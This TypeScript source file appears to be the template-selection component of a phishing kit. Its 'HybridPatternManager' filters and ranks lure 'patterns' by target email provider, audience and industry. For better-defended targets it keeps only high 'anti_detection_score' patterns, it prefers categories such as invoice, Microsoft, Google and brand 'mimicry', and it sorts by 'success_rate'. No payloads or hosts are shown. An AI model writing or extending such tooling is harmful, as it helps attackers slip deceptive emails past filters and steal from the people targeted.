/**
 * HYBRID PATTERN MANAGER
 * Works with local patterns but can optionally sync with database
 * Provides seamless offline/online operation
 */

import { getLocalPatterns, getPatternById, type LocalPattern } from '@/data/localPatterns';
import { localPatternAnalyzer } from './localPatternAnalyzer';
import { optionalAnalytics } from './optionalAnalytics';

export interface PatternContext {
  industry?: string;
  targetCountry?: string;
  securityLevel?: 'low' | 'medium' | 'high';
  emailProvider?: 'microsoft' | 'google' | 'corporate' | 'generic';
  targetAudience?: 'business' | 'consumer' | 'mixed';
}

export interface PatternRecommendation {
  patternId: string;
  patternName: string;
  category: string;
  successRate: number;
  tier: number;
  reasoning: string;
  confidence: number;
}

class HybridPatternManager {
  private static instance: HybridPatternManager;
  private patternCache = new Map<string, LocalPattern[]>();
  private readonly CACHE_TTL = 10 * 60 * 1000; // 10 minutes

  private constructor() {}

  static getInstance(): HybridPatternManager {
    if (!HybridPatternManager.instance) {
      HybridPatternManager.instance = new HybridPatternManager();
    }
    return HybridPatternManager.instance;
  }

  /**
   * Get patterns with intelligent filtering
   */
  async getPatterns(context?: PatternContext): Promise<LocalPattern[]> {
    const cacheKey = context ? JSON.stringify(context) : 'all';
    
    // Check cache first
    const cached = this.patternCache.get(cacheKey);
    if (cached) {
      console.log('🎯 [HybridPatternManager] Using cached patterns');
      return cached;
    }

    console.log('🔍 [HybridPatternManager] Loading patterns with context:', context);

    // Get patterns from local library
    let patterns = getLocalPatterns();

    // Apply context-based filtering
    if (context) {
      patterns = this.filterPatternsByContext(patterns, context);
    }

    // Cache results
    this.patternCache.set(cacheKey, patterns);
    setTimeout(() => this.patternCache.delete(cacheKey), this.CACHE_TTL);

    // Track pattern access (optional analytics)
    await optionalAnalytics.trackEvent('patterns_accessed', {
      count: patterns.length,
      context,
      source: 'local_library'
    });

    return patterns;
  }

  /**
   * Get pattern recommendations using local analyzer
   */
  async getRecommendations(context: PatternContext, limit: number = 5): Promise<PatternRecommendation[]> {
    console.log('🧠 [HybridPatternManager] Getting pattern recommendations');

    try {
      const analysis = await localPatternAnalyzer.analyzePatterns(context);
      
      return analysis.slice(0, limit).map(result => ({
        patternId: result.patternId,
        patternName: result.patternName,
        category: result.metadata.category,
        successRate: result.metadata.successRate,
        tier: result.metadata.tier,
        reasoning: result.reasoning[0] || 'AI-optimized selection',
        confidence: result.confidence
      }));
    } catch (error) {
      console.warn('🧠 [HybridPatternManager] Analysis failed, using fallback:', error);
      
      // Fallback to simple filtering
      const patterns = await this.getPatterns(context);
      return patterns.slice(0, limit).map(pattern => ({
        patternId: pattern.id,
        patternName: pattern.name,
        category: pattern.category,
        successRate: pattern.success_rate,
        tier: pattern.tier,
        reasoning: 'High-performance pattern',
        confidence: 80
      }));
    }
  }

  /**
   * Select optimal pattern for given context
   */
  async selectOptimalPattern(context: PatternContext): Promise<LocalPattern | null> {
    try {
      const optimalPattern = await localPatternAnalyzer.selectOptimalPattern(context);
      
      if (optimalPattern) {
        // Track pattern selection (optional analytics)
        await optionalAnalytics.trackPatternUsage(
          optimalPattern.id,
          optimalPattern.name,
          true
        );
      }
      
      return optimalPattern;
    } catch (error) {
      console.warn('🧠 [HybridPatternManager] Optimal selection failed, using fallback:', error);
      
      // Fallback to first high-tier pattern
      const patterns = await this.getPatterns(context);
      const fallbackPattern = patterns.find(p => p.tier === 1) || patterns[0] || null;
      
      if (fallbackPattern) {
        await optionalAnalytics.trackPatternUsage(
          fallbackPattern.id,
          fallbackPattern.name,
          true
        );
      }
      
      return fallbackPattern;
    }
  }

  /**
   * Filter patterns by context
   */
  private filterPatternsByContext(patterns: LocalPattern[], context: PatternContext): LocalPattern[] {
    let filtered = [...patterns];

    // Filter by email provider optimization
    if (context.emailProvider) {
      filtered = filtered.filter(pattern => 
        !pattern.provider_optimization || 
        pattern.provider_optimization.includes(context.emailProvider!) ||
        pattern.provider_optimization.includes('generic')
      );
    }

    // Filter by industry
    if (context.industry) {
      filtered = filtered.filter(pattern =>
        pattern.industry === context.industry ||
        pattern.industry === 'general'
      );
    }

    // Filter by security level
    if (context.securityLevel === 'high') {
      filtered = filtered.filter(pattern => 
        pattern.tier === 1 && (pattern.anti_detection_score || 85) >= 90
      );
    }

    // Filter by target audience
    if (context.targetAudience === 'business') {
      filtered = filtered.filter(pattern =>
        ['document', 'business', 'microsoft', 'invoice', 'calendar'].includes(pattern.category)
      );
    } else if (context.targetAudience === 'consumer') {
      filtered = filtered.filter(pattern =>
        ['google', 'mimicry', 'content', 'cloudStorage'].includes(pattern.category)
      );
    }

    // Sort by success rate
    return filtered.sort((a, b) => b.success_rate - a.success_rate);
  }

  /**
   * Get pattern by ID
   */
  async getPatternById(id: string): Promise<LocalPattern | null> {
    return getPatternById(id);
  }

  /**
   * Get patterns by category
   */
  async getPatternsByCategory(category: string): Promise<LocalPattern[]> {
    const allPatterns = getLocalPatterns();
    return allPatterns.filter(p => p.category === category);
  }

  /**
   * Get pattern statistics
   */
  getPatternStats() {
    const allPatterns = getLocalPatterns();
    const categories = [...new Set(allPatterns.map(p => p.category))];
    const avgSuccessRate = allPatterns.reduce((sum, p) => sum + p.success_rate, 0) / allPatterns.length;
    
    const tierDistribution = allPatterns.reduce((acc, p) => {
      acc[p.tier] = (acc[p.tier] || 0) + 1;
      return acc;
    }, {} as Record<number, number>);

    const categoryDistribution = allPatterns.reduce((acc, p) => {
      acc[p.category] = (acc[p.category] || 0) + 1;
      return acc;
    }, {} as Record<string, number>);

    return {
      totalPatterns: allPatterns.length,
      categories: categories.length,
      avgSuccessRate: Math.round(avgSuccessRate),
      tierDistribution,
      categoryDistribution,
      cacheSize: this.patternCache.size,
      lastUpdated: new Date().toISOString()
    };
  }

  /**
   * Clear pattern cache
   */
  clearCache(): void {
    this.patternCache.clear();
    console.log('🧹 [HybridPatternManager] Pattern cache cleared');
  }

  /**
   * Predict pattern performance
   */
  async predictPerformance(patternId: string, context: PatternContext): Promise<{
    predictedSuccessRate: number;
    confidenceLevel: 'low' | 'medium' | 'high';
    factors: string[];
  }> {
    return await localPatternAnalyzer.predictPerformance(patternId, context);
  }

  /**
   * Get manager status
   */
  getStatus() {
    return {
      totalPatterns: getLocalPatterns().length,
      cacheSize: this.patternCache.size,
      source: 'local_library',
      analyticsEnabled: optionalAnalytics.getStatus().enabled,
      lastAccess: new Date().toISOString()
    };
  }
}

// Export singleton instance
export const hybridPatternManager = HybridPatternManager.getInstance();

// Compatibility exports for existing code
export const advancedPatternManager = hybridPatternManager;
export const getPatterns = (context?: PatternContext) => hybridPatternManager.getPatterns(context);
export const getRecommendations = (context: PatternContext, limit?: number) => 
  hybridPatternManager.getRecommendations(context, limit);
export const selectOptimalPattern = (context: PatternContext) => 
  hybridPatternManager.selectOptimalPattern(context);
